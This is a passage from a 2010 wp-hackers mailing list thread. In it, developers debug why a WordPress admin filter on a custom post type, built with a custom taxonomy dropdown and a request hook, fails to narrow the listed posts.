On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:

> Array ( [order] => asc [orderby] => menu_order title [post_type] =>
> ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
> 
> url after clicking "filter" button :
> 
> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
> 
> 
> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> 
>> What do you get in the view source when you using this instead:
>> 
>> function request($request) {
>>       print_r($request);
>>       exit;
>> }
>> 
>> Also, what's your URL after clicking the "Filter" button?
>> 
>> -Mike
>> 
>> 
>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>> 
>>> now, when I click on filter button the result is always the same, all
>> list
>>> of ressources.
>>> 
>>> my code :
>>> 
>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>>> 
>>> function register_profperso_taxonomies() {
>>> 
>>> register_taxonomy(
>>> 'classement_fr',
>>> array( 'ressource_fr' ),
>>> array(
>>> 'public' => true,
>>> 'hierarchical' => true,
>>> 'labels' => array(
>>> 'name' => __( 'Classements FR' ),
>>> 'singular_name' => __( 'Classement FR' )
>>> ),
>>> 'query_var' => 'classement-fr',
>>>       'rewrite' => array( 'slug' => 'cours-fr' ),
>>> )
>>> );
>>> }
>>> 
>>> 
>>> // pour filtrer les ressources par classement
>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>>> 
>>> function my_restrict_manage_posts() {
>>> global $typenow;
>>> if ($typenow=='ressource_fr')
>>> wp_dropdown_categories( 'show_option_all=Afficher
>>> 
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>>> }
>>> 
>>> add_action( 'request', 'my_request' );
>>> function my_request($request) {
>>>      if (isset($request['post_type']) &&
>>> $request['post_type']=='ressource_fr') {
>>>              $request['taxonomy'] = 'classement_fr';
>>>              $request['term'] =
>>> get_term($request['classement-fr'],'classement_fr')->name;
>>>              unset($request['name']);
>>>      }
>>>      return $request;
>>> }
>>> 
>>> generated html :
>>> <select id="classement_fr" name="classement_fr"> <option value="0">Show
>> All
>>> Classements FR</option> <option value="5">Langue oral</option> <option
>> value
>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
>> value="8
>>> ">Niveau 3</option> </select><input type="submit" id="post-query-submit"
>>> value="Filtrer" class="button-secondary" />
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From jimmy.roy at gmail.com  Fri Jul 23 10:46:40 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 18:46:40 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <7EC8DB89-7E18-4F2C-B94A-E1B78B29EA88@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com>
	<7EC8DB89-7E18-4F2C-B94A-E1B78B29EA88@newclarity.net>
Message-ID: <AANLkTikDq2vEg342XC0jyQcYvP21trthAnDMTJcMGnbq@mail.gmail.com>

ok, I will post the code there.
I don't use any plugin.

Jimmy



2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>

> Jimmy,
>
> Please do the same I asked of Frank. Again, show me your
>  register_post_type, request hook, restrict_manage_posts. Post the code at
> http://wordpress.pastebin.com/ or http://gist.github.com/ so it's indented
> and easier to read.
>
> Also, are you using any other plugins that might be affecting the query
> vars?
>
> -Mike
>
> On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
>
> > Array ( [order] => asc [orderby] => menu_order title [post_type] =>
> > ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
> >
> > url after clicking "filter" button :
> >
> >
> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
> >
> >
> > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >
> >> What do you get in the view source when you using this instead:
> >>
> >> function request($request) {
> >>       print_r($request);
> >>       exit;
> >> }
> >>
> >> Also, what's your URL after clicking the "Filter" button?
> >>
> >> -Mike
> >>
> >>
> >> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
> >>
> >>> now, when I click on filter button the result is always the same, all
> >> list
> >>> of ressources.
> >>>
> >>> my code :
> >>>
> >>> add_action( 'init', 'register_profperso_taxonomies', 0 );
> >>>
> >>> function register_profperso_taxonomies() {
> >>>
> >>> register_taxonomy(
> >>> 'classement_fr',
> >>> array( 'ressource_fr' ),
> >>> array(
> >>> 'public' => true,
> >>> 'hierarchical' => true,
> >>> 'labels' => array(
> >>> 'name' => __( 'Classements FR' ),
> >>> 'singular_name' => __( 'Classement FR' )
> >>> ),
> >>> 'query_var' => 'classement-fr',
> >>>       'rewrite' => array( 'slug' => 'cours-fr' ),
> >>> )
> >>> );
> >>> }
> >>>
> >>>
> >>> // pour filtrer les ressources par classement
> >>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
> >>>
> >>> function my_restrict_manage_posts() {
> >>> global $typenow;
> >>> if ($typenow=='ressource_fr')
> >>> wp_dropdown_categories( 'show_option_all=Afficher
> >>>
> >>
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> >>> }
> >>>
> >>> add_action( 'request', 'my_request' );
> >>> function my_request($request) {
> >>>      if (isset($request['post_type']) &&
> >>> $request['post_type']=='ressource_fr') {
> >>>              $request['taxonomy'] = 'classement_fr';
> >>>              $request['term'] =
> >>> get_term($request['classement-fr'],'classement_fr')->name;
> >>>              unset($request['name']);
> >>>      }
> >>>      return $request;
> >>> }
> >>>
> >>> generated html :
> >>> <select id="classement_fr" name="classement_fr"> <option value="0">Show
> >> All
> >>> Classements FR</option> <option value="5">Langue oral</option> <option
> >> value
> >>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
> >> value="8
> >>> ">Niveau 3</option> </select><input type="submit"
> id="post-query-submit"
> >>> value="Filtrer" class="button-secondary" />
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From frank at bueltge.de  Fri Jul 23 11:02:34 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Fri, 23 Jul 2010 13:02:34 +0200
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <131219FF-A4BD-4DD4-921E-2584E2636833@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com> 
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com> 
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com> 
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com> 
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com> 
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com> 
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com> 
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com> 
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com> 
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com> 
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTinTDBVh4ybUdkC8fq2a06ke4yc7ic5N-hgRof17@mail.gmail.com> 
	<131219FF-A4BD-4DD4-921E-2584E2636833@newclarity.net>
Message-ID: <AANLkTinXfH2EO-Bv5KCZgH_6DuE-QKf9xwVSLCLOgTE5@mail.gmail.com>

@mike: i hope is not to much source, is an example plugin to test
possibilies with custom post type
http://wordpress.pastebin.com/0u7DW03C



On Fri, Jul 23, 2010 at 12:31 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> Frank,
>
> Please show me your ?register_post_type, request hook, restrict_manage_posts. Post the code at http://wordpress.pastebin.com/ or http://gist.github.com/ so it's indented and easier to read.
>
> -Mike
>
> On Jul 23, 2010, at 6:29 AM, Frank Bueltge wrote:
>
>> with fitler:
>> Array ( [cat] => 26 [order] => DESC [orderby] => date [post_type] =>
>> quotes [posts_per_page] => 20 )
>>
>> default, without filter.
>> Array ( [order] => DESC [orderby] => date [post_type] => quotes
>> [posts_per_page] => 20 )
>>
>>
>>
>> On Fri, Jul 23, 2010 at 12:23 PM, Mike Schinkel
>> <mikeschinkel at newclarity.net> wrote:
>>> What do you get in the view source when you using this instead:
>>>
>>> function request($request) {
>>> ? ? ? ?print_r($request);
>>> ? ? ? ?exit;
>>> }
>>>
>>> Also, what's your URL after clicking the "Filter" button?
>>>
>>> -Mike
>>>
>>>
>>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>>>
>>>> now, when I click on filter button the result is always the same, all list
>>>> of ressources.
>>>>
>>>> my code :
>>>>
>>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>>>>
>>>> function register_profperso_taxonomies() {
>>>>
>>>> register_taxonomy(
>>>> 'classement_fr',
>>>> array( 'ressource_fr' ),
>>>> array(
>>>> 'public' => true,
>>>> 'hierarchical' => true,
>>>> 'labels' => array(
>>>> 'name' => __( 'Classements FR' ),
>>>> 'singular_name' => __( 'Classement FR' )
>>>> ),
>>>> 'query_var' => 'classement-fr',
>>>> ? ? ? ?'rewrite' => array( 'slug' => 'cours-fr' ),
>>>> )
>>>> );
>>>> }
>>>>
>>>>
>>>> // pour filtrer les ressources par classement
>>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>>>>
>>>> function my_restrict_manage_posts() {
>>>> global $typenow;
>>>> if ($typenow=='ressource_fr')
>>>> wp_dropdown_categories( 'show_option_all=Afficher
>>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>>>> }
>>>>
>>>> add_action( 'request', 'my_request' );
>>>> function my_request($request) {
>>>> ? ? ? if (isset($request['post_type']) &&
>>>> $request['post_type']=='ressource_fr') {
>>>> ? ? ? ? ? ? ? $request['taxonomy'] = 'classement_fr';
>>>> ? ? ? ? ? ? ? $request['term'] =
>>>> get_term($request['classement-fr'],'classement_fr')->name;
>>>> ? ? ? ? ? ? ? unset($request['name']);
>>>> ? ? ? }
>>>> ? ? ? return $request;
>>>> }
>>>>
>>>> generated html :
>>>> <select id="classement_fr" name="classement_fr"> <option value="0">Show All
>>>> Classements FR</option> <option value="5">Langue oral</option> <option value
>>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option value="8
>>>> ">Niveau 3</option> </select><input type="submit" id="post-query-submit"
>>>> value="Filtrer" class="button-secondary" />
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Fri Jul 23 11:04:54 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 07:04:54 -0400
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com>
Message-ID: <BD16269A-6163-4F9F-BFC8-CDA525E5908F@newclarity.net>

Jimmy,

I just noticed, '[classement_fr] => 6' is not in your array.

First try to use either "classement_fr" everywhere or "classement-fr" and see if that fixes it.

-Mike

On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:

> Array ( [order] => asc [orderby] => menu_order title [post_type] =>
> ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
> 
> url after clicking "filter" button :
> 
> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
> 
> 
> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> 
>> What do you get in the view source when you using this instead:
>> 
>> function request($request) {
>>       print_r($request);
>>       exit;
>> }
>> 
>> Also, what's your URL after clicking the "Filter" button?
>> 
>> -Mike
>> 
>> 
>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>> 
>>> now, when I click on filter button the result is always the same, all
>> list
>>> of ressources.
>>> 
>>> my code :
>>> 
>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>>> 
>>> function register_profperso_taxonomies() {
>>> 
>>> register_taxonomy(
>>> 'classement_fr',
>>> array( 'ressource_fr' ),
>>> array(
>>> 'public' => true,
>>> 'hierarchical' => true,
>>> 'labels' => array(
>>> 'name' => __( 'Classements FR' ),
>>> 'singular_name' => __( 'Classement FR' )
>>> ),
>>> 'query_var' => 'classement-fr',
>>>       'rewrite' => array( 'slug' => 'cours-fr' ),
>>> )
>>> );
>>> }
>>> 
>>> 
>>> // pour filtrer les ressources par classement
>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>>> 
>>> function my_restrict_manage_posts() {
>>> global $typenow;
>>> if ($typenow=='ressource_fr')
>>> wp_dropdown_categories( 'show_option_all=Afficher
>>> 
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>>> }
>>> 
>>> add_action( 'request', 'my_request' );
>>> function my_request($request) {
>>>      if (isset($request['post_type']) &&
>>> $request['post_type']=='ressource_fr') {
>>>              $request['taxonomy'] = 'classement_fr';
>>>              $request['term'] =
>>> get_term($request['classement-fr'],'classement_fr')->name;
>>>              unset($request['name']);
>>>      }
>>>      return $request;
>>> }
>>> 
>>> generated html :
>>> <select id="classement_fr" name="classement_fr"> <option value="0">Show
>> All
>>> Classements FR</option> <option value="5">Langue oral</option> <option
>> value
>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
>> value="8
>>> ">Niveau 3</option> </select><input type="submit" id="post-query-submit"
>>> value="Filtrer" class="button-secondary" />
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Fri Jul 23 11:12:56 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 07:12:56 -0400
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTinXfH2EO-Bv5KCZgH_6DuE-QKf9xwVSLCLOgTE5@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTinTDBVh4ybUdkC8fq2a06ke4yc7ic5N-hgRof17@mail.gmail.com> <131
	219FF-A4BD-4DD4-921E-2584E2636833@newclarity.net>
	<AANLkTinXfH2EO-Bv5KCZgH_6DuE-QKf9xwVSLCLOgTE5@mail.gmail.com>
Message-ID: <B0E5841F-AB25-47BE-94D4-C815460BA672@newclarity.net>

One problem, for sure, is line 131, should be:

 wp_dropdown_categories( 'show_option_all=' . __( 'View all authors', FB_CPT_TEXTDOMAIN ) . '&show_count=1&hierarchical=1&taxonomy=' .FB_CPT_TAXONOMY_TYPE_1 . '&name=' .FB_CPT_TAXONOMY_TYPE_1);

If that doesn't solve it you may be on your own (or get someone else here to help) as I have to get some sleep eventually...

On Jul 23, 2010, at 7:02 AM, Frank Bueltge wrote:

> @mike: i hope is not to much source, is an example plugin to test
> possibilies with custom post type
> http://wordpress.pastebin.com/0u7DW03C
> 
> 
> 
> On Fri, Jul 23, 2010 at 12:31 PM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> Frank,
>> 
>> Please show me your  register_post_type, request hook, restrict_manage_posts. Post the code at http://wordpress.pastebin.com/ or http://gist.github.com/ so it's indented and easier to read.
>> 
>> -Mike
>> 
>> On Jul 23, 2010, at 6:29 AM, Frank Bueltge wrote:
>> 
>>> with fitler:
>>> Array ( [cat] => 26 [order] => DESC [orderby] => date [post_type] =>
>>> quotes [posts_per_page] => 20 )
>>> 
>>> default, without filter.
>>> Array ( [order] => DESC [orderby] => date [post_type] => quotes
>>> [posts_per_page] => 20 )
>>> 
>>> 
>>> 
>>> On Fri, Jul 23, 2010 at 12:23 PM, Mike Schinkel
>>> <mikeschinkel at newclarity.net> wrote:
>>>> What do you get in the view source when you using this instead:
>>>> 
>>>> function request($request) {
>>>>        print_r($request);
>>>>        exit;
>>>> }
>>>> 
>>>> Also, what's your URL after clicking the "Filter" button?
>>>> 
>>>> -Mike
>>>> 
>>>> 
>>>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>>>> 
>>>>> now, when I click on filter button the result is always the same, all list
>>>>> of ressources.
>>>>> 
>>>>> my code :
>>>>> 
>>>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>>>>> 
>>>>> function register_profperso_taxonomies() {
>>>>> 
>>>>> register_taxonomy(
>>>>> 'classement_fr',
>>>>> array( 'ressource_fr' ),
>>>>> array(
>>>>> 'public' => true,
>>>>> 'hierarchical' => true,
>>>>> 'labels' => array(
>>>>> 'name' => __( 'Classements FR' ),
>>>>> 'singular_name' => __( 'Classement FR' )
>>>>> ),
>>>>> 'query_var' => 'classement-fr',
>>>>>        'rewrite' => array( 'slug' => 'cours-fr' ),
>>>>> )
>>>>> );
>>>>> }
>>>>> 
>>>>> 
>>>>> // pour filtrer les ressources par classement
>>>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>>>>> 
>>>>> function my_restrict_manage_posts() {
>>>>> global $typenow;
>>>>> if ($typenow=='ressource_fr')
>>>>> wp_dropdown_categories( 'show_option_all=Afficher
>>>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>>>>> }
>>>>> 
>>>>> add_action( 'request', 'my_request' );
>>>>> function my_request($request) {
>>>>>       if (isset($request['post_type']) &&
>>>>> $request['post_type']=='ressource_fr') {
>>>>>               $request['taxonomy'] = 'classement_fr';
>>>>>               $request['term'] =
>>>>> get_term($request['classement-fr'],'classement_fr')->name;
>>>>>               unset($request['name']);
>>>>>       }
>>>>>       return $request;
>>>>> }
>>>>> 
>>>>> generated html :
>>>>> <select id="classement_fr" name="classement_fr"> <option value="0">Show All
>>>>> Classements FR</option> <option value="5">Langue oral</option> <option value
>>>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option value="8
>>>>> ">Niveau 3</option> </select><input type="submit" id="post-query-submit"
>>>>> value="Filtrer" class="button-secondary" />
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From jimmy.roy at gmail.com  Fri Jul 23 11:19:10 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 19:19:10 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <BD16269A-6163-4F9F-BFC8-CDA525E5908F@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com>
	<BD16269A-6163-4F9F-BFC8-CDA525E5908F@newclarity.net>
Message-ID: <AANLkTi=m6ZK48sBBgGYGEtSBbGia3rHeaiJZVQzc9Ja4@mail.gmail.com>

Mike,
classement_fr is the name of the taxonomy.
classement-fr is the value of the query_var argument.

Jimmy



2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>

> Jimmy,
>
> I just noticed, '[classement_fr] => 6' is not in your array.
>
> First try to use either "classement_fr" everywhere or "classement-fr" and
> see if that fixes it.
>
> -Mike
>
> On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
>
> > Array ( [order] => asc [orderby] => menu_order title [post_type] =>
> > ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
> >
> > url after clicking "filter" button :
> >
> >
> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
> >
> >
> > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >
> >> What do you get in the view source when you using this instead:
> >>
> >> function request($request) {
> >>       print_r($request);
> >>       exit;
> >> }
> >>
> >> Also, what's your URL after clicking the "Filter" button?
> >>
> >> -Mike
> >>
> >>
> >> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
> >>
> >>> now, when I click on filter button the result is always the same, all
> >> list
> >>> of ressources.
> >>>
> >>> my code :
> >>>
> >>> add_action( 'init', 'register_profperso_taxonomies', 0 );
> >>>
> >>> function register_profperso_taxonomies() {
> >>>
> >>> register_taxonomy(
> >>> 'classement_fr',
> >>> array( 'ressource_fr' ),
> >>> array(
> >>> 'public' => true,
> >>> 'hierarchical' => true,
> >>> 'labels' => array(
> >>> 'name' => __( 'Classements FR' ),
> >>> 'singular_name' => __( 'Classement FR' )
> >>> ),
> >>> 'query_var' => 'classement-fr',
> >>>       'rewrite' => array( 'slug' => 'cours-fr' ),
> >>> )
> >>> );
> >>> }
> >>>
> >>>
> >>> // pour filtrer les ressources par classement
